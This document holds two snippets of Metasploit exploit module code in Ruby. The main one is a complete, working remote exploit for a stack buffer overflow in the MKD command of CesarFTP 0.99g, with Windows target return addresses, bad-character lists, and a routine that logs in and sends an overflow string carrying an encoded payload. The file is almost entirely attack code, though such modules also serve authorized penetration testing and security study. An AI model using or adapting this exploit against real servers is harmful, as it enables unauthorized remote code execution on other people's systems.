["```\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\n    Rank = ExcellentRanking\n      include Msf::Exploit::Remote::Tcp\n    include Msf::Exploit::EXE\n```", "```\n##\n# $Id: cesarftp_mkd.rb 14774 2012-02-21 01:42:17Z rapid7 $\n##\n\n##\n# This file is part of the Metasploit Framework and may be subject to\n# redistribution and commercial restrictions. Please see the Metasploit\n# web site for more information on licensing and terms of use.\n#   http://metasploit.com/\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n\tRank = AverageRanking\n\n\tinclude Msf::Exploit::Remote::Ftp\n\n\tdef initialize(info = {})\n\t\tsuper(update_info(info,\n\t\t\t'Name'           => 'Cesar FTP 0.99g MKD Command Buffer Overflow',\n\t\t\t'Description'    => %q{\n\t\t\t\tThis module exploits a stack buffer overflow in the MKD verb in CesarFTP 0.99g.\n\n\t\t\t\tYou must have valid credentials to trigger this vulnerability. Also, you\n\t\t\t\tonly get one chance, so choose your target carefully.\n\t\t\t},\n\t\t\t'Author'         => 'MC',\n\t\t\t'License'        => MSF_LICENSE,\n\t\t\t'Version'        => '$Revision: 14774 $',\n\t\t\t'References'     =>\n\t\t\t\t[\n\t\t\t\t\t[ 'CVE', '2006-2961'],\n\t\t\t\t\t[ 'OSVDB', '26364'],\n\t\t\t\t\t[ 'BID', '18586'],\n\t\t\t\t\t[ 'URL', 'http://secunia.com/advisories/20574/' ],\n\t\t\t\t],\n\t\t\t'Privileged'     => true,\n\t\t\t'DefaultOptions' =>\n\t\t\t\t{\n\t\t\t\t\t'EXITFUNC' => 'process',\n\t\t\t\t},\n\t\t\t'Payload'        =>\n\t\t\t\t{\n\t\t\t\t\t'Space'    => 250,\n\t\t\t\t\t'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n\t\t\t\t\t'StackAdjustment' => -3500,\n\t\t\t\t\t'Compat'        =>\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t'SymbolLookup' => 'ws2ord',\n\t\t\t\t\t\t}\n\t\t\t\t},\n\t\t\t'Platform'       => 'win',\n\t\t\t'Targets'        =>\n\t\t\t\t[\n\t\t\t\t\t[ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x77e14c29 } ],\n\t\t\t\t\t[ 'Windows 2000 Pro SP4 French',  { 'Ret' => 0x775F29D0 } ],\n\t\t\t\t\t[ 'Windows XP SP2/SP3 English',       { 'Ret' => 0x774699bf } ], # jmp esp, user32.dll\n\t\t\t\t\t#[ 'Windows XP SP2 English',       { 'Ret' => 0x76b43ae0 } ], # jmp esp, winmm.dll\n\t\t\t\t\t#[ 'Windows XP SP3 English',       { 'Ret' => 0x76b43adc } ], # jmp esp, winmm.dll\n\t\t\t\t\t[ 'Windows 2003 SP1 English',     { 'Ret' => 0x76AA679b } ],\n\t\t\t\t],\n\t\t\t'DisclosureDate' => 'Jun 12 2006',\n\t\t\t'DefaultTarget'  => 0))\n\tend\n\n\tdef check\n\t\tconnect\n\t\tdisconnect\n\n\t\tif (banner =~ /CesarFTP 0\\.99g/)\n\t\t\treturn Exploit::CheckCode::Vulnerable\n\t\tend\n\t\t\treturn Exploit::CheckCode::Safe\n\tend\n\n\tdef exploit\n\t\tconnect_login\n\n\t\tsploit =  \"\\n\" * 671 + rand_text_english(3, payload_badchars)\n\t\tsploit << [target.ret].pack('V') + make_nops(40) + payload.encoded\n\n\t\tprint_status(\"Trying target #{target.name}...\")\n\n\t\tsend_cmd( ['MKD', sploit] , false)\n\n\t\thandler\n\t\tdisconnect\n\tend\n\nend\n```"]